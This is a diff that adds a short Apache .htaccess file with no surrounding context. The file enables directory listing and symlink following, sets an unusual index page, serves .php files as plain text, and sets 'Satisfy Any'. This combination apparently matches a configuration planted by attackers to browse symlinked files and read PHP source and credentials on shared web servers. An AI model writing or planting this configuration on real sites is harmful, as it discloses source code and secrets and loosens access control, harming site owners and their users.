@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex eps.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
